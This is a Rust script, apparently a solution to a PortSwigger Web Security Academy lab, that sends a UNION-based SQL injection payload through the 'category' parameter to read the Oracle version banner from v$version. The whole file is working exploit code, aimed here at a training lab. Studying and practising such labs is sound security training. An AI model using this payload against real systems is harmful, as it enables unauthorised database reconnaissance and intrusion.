/*******************************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 15/9/2023
*
* Lab: SQL injection attack, querying the database type and version on Oracle
*
* Steps: 1. Inject payload in 'category' query parameter
*        2. Retrieve database banner in the response
*
********************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a0a0041033073c5810ea2a600b4006c.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    print!(
        "{}",
        "1. Injecting payload in 'category' query parameter.. ".white(),
    );
    io::stdout().flush();
    // the payload to inject in the query parameter
    let payload = "' UNION SELECT banner, null FROM v$version-- -";
    // fetch the page with the injected payload
    let inject = client
        .get(format!("{url}/filter?category=Gifts{payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));
    println!("{}", "OK".green());
    println!(
        "{} {}",
        "2. Retrieving database banner in the response..".white(),
        "OK".green()
    );
    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
